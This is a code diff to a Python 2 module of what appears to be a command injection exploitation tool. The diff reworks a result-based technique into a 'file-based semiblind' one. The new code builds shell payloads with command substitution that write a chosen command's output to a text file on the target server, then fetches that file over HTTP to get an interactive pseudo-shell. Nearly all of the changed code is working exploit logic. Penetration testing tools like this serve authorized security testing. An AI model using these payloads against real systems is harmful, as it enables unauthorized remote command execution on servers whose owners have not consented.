@@ -15,6 +15,7 @@
 """
 
 import re
+import os
 import sys
 import time
 import string
@@ -31,7 +32,7 @@ from src.core.requests import headers
 from src.core.requests import parameters
 
 """
-  The "classic" technique on Result-based OS Command Injection.
+ The "File-based" technique on Semiblind-based OS Command Injection.
 """
 
 def exploitation(url,delay,filename):
@@ -40,9 +41,9 @@ def exploitation(url,delay,filename):
   vp_flag = True
   no_result = True
   is_encoded= False
-  injection_type = "Results-based Command Injection"
-  technique = "classic injection technique"
-      
+  injection_type = "Semiblind-based Command Injection"
+  technique = "file-based semiblind-based injection technique"
+  
   sys.stdout.write( "(*) Testing the "+ technique +"... ")
   sys.stdout.flush()
   
@@ -78,17 +79,19 @@ def exploitation(url,delay,filename):
 	    B64_ENC_TAG = TAG
 	    B64_DEC_TRICK = ""
 	    
+	  # The output file for boolean-based injection technique.
+	  OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
+	    
 	  try:
-	    payload = (seperator + 
-		      "echo '" + TAG + "'" +
-		      "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + ")'" + TAG + "'"
+	    payload = (seperator + " " +
+		      "$(echo '" + B64_ENC_TAG + "'" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
 			) 
-			    
+		    
 	    # Check if defined "--prefix" option.
 	    if menu.options.prefix:
 	      prefix = menu.options.prefix
 	      payload = prefix + payload
-	      
+	      	      
 	    else:
 	      encoded_payload = encoded_prefix + payload
 	      payload = prefix + payload
@@ -104,6 +107,7 @@ def exploitation(url,delay,filename):
 
 	    payload_list = []
 	    if payload != encoded_payload:
+	      print encoded_payload
 	      payload_list.append(payload)
 	      payload_list.append(encoded_payload)
 	    else:
@@ -137,11 +141,11 @@ def exploitation(url,delay,filename):
 		  
 		else:
 		  vuln_parameter = url
-		
-		vuln_parameter = ''.join(vuln_parameter)
+
+		payload = urllib.quote(payload)
 		target = re.sub(settings.INJECT_TAG, payload, url)
 		request = urllib2.Request(target)
-
+		
 		# Check if defined extra headers.
 		headers.do_check(request)
 
@@ -200,15 +204,36 @@ def exploitation(url,delay,filename):
 	    
 		else:
 		  response = urllib2.urlopen(request)
-		    
-	      # if need page reload
-	      if menu.options.url_reload: 
-		time.sleep(delay)
-		response = urllib.urlopen(url)
-		
-	      html_data = response.read()
-	      shell = re.findall(r""+TAG+TAG+TAG+"", html_data)
-	    
+		  
+	      # Find the directory.
+	      path = url
+	      path_parts = path.split('/')
+	      count = 0
+	      for part in path_parts:	
+		count = count + 1
+	      count = count - 1
+	      last_param = path_parts[count]
+	      output = url.replace(last_param,OUTPUT_TEXTFILE)
+	      time.sleep(delay)
+	      
+	      try:
+		output = urllib2.urlopen(output)
+		html_data = output.read()
+		  
+	      except urllib2.HTTPError, e:
+		  if e.getcode() == 404:
+		    print colors.RED + "\n(x) Error: The requested URL (" + output +") was not found on this server (404)." + colors.RESET
+		    check_next = raw_input("(*) Do you want to continue? [Y/n] > ")
+		    if check_next == "Y" or check_next == "y" :
+		      pass
+		    else:
+		      os._exit(0)
+		  
+	      except urllib2.URLError, e:
+		  print colors.RED + "(x) Error: The host seems to be down!" + colors.RESET
+		  sys.exit(0)
+		  
+	    shell = re.findall(r""+TAG+"", html_data)
 	  except:
 	    continue
 	  
@@ -274,11 +299,8 @@ def exploitation(url,delay,filename):
 		    sys.exit(0)
 		    
 		  else:
-		    payload = (seperator + 
-			      "echo '" + TAG + "'" +
-			      "$(echo '"+TAG+"')"+
-			      "$(" + cmd + ")"+
-			      "$(echo '" + TAG + "')'" + TAG +"'"
+		    payload = (seperator +
+			      "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
 			      )
 		    
 		    if seperator == " " :
@@ -369,12 +391,34 @@ def exploitation(url,delay,filename):
 			response = urllib2.urlopen(request)
 			
 		    # if need page reload
-		    if menu.options.url_reload:
-		      time.sleep(delay)
-		      response = urllib.urlopen(url)
+		    #if menu.options.url_reload:
+		      #time.sleep(delay)
+		      #response = urllib.urlopen(url)
 
-		    html_data = response.read()
-		    shell = re.findall(r""+TAG+TAG+"(.*)"+TAG+TAG+"", html_data)
+		    path = url
+		    path_parts = path.split('/')
+		    count = 0
+		    
+		    for part in path_parts:	
+		      count = count + 1
+
+		    count = count - 1
+		    last_param = path_parts[count]
+		    output = url.replace(last_param, OUTPUT_TEXTFILE)
+		    time.sleep(delay)
+				    
+		    try:
+		      output = urllib2.urlopen(output)
+		      html_data = output.read()
+		      
+		    except urllib2.HTTPError, e:
+			if e.getcode() == 404:
+			  continue
+		      
+		    except urllib2.URLError, e:
+			pass
+		      
+		    shell = re.findall(r"(.*)", html_data)
 		    
 		    if shell:
 		      shell = "".join(str(p) for p in shell)
